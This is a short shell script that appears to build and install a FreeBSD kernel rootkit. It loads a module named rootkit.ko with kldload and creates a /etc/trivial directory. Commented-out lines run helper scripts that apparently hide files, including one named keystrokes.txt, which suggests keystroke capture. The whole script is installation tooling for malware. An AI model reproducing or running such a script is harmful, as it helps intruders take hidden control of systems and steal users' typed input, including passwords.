#!/bin/sh

make clean
make
mkdir /etc/trivial
kldload ./rootkit.ko
cd ../interact/
cc syscall.c -o syscall

# ./add.sh syscall_number.txt
# ./setflags.sh syscall_number.txt 01
# ./add.sh trivial
# ./setflags.sh trivial 01
# ./add.sh keystrokes.txt
# ./setflags.sh keystrokes.txt 01
